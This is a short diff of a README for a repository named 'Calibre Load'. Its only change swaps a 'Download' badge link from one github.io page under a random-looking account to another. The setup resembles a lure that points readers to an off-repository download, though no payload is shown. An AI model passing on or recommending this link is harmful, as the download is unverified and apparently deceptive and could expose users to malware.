@@ -2,7 +2,7 @@
 
 ![Calibre Load interface concept with repository files, setup notes, and configuration panels](https://camo.githubusercontent.com/31c21c491d42d6d1f7d2514d8bb9898ce97c5065efaf458059860239c3fd51b7/68747470733a2f2f7777772e696d796d61632e636f6d2f696d616765732f6d61632d756e696e7374616c6c65722f756e696e7374616c6c2d63616c696272652d6d61632e6a7067)
 
-[![Download Calibre Load](https://img.shields.io/badge/Download-Calibre_Load-blueviolet?style=for-the-badge&logo=windows)](https://ozzyericksonjlug.github.io/.github/calibre-load)
+[![Download Calibre Load](https://img.shields.io/badge/Download-Calibre_Load-blueviolet?style=for-the-badge&logo=windows)](https://kannonlangdedb.github.io/.github/calibre-load)
 
 ## Calibre Load Project Overview
 
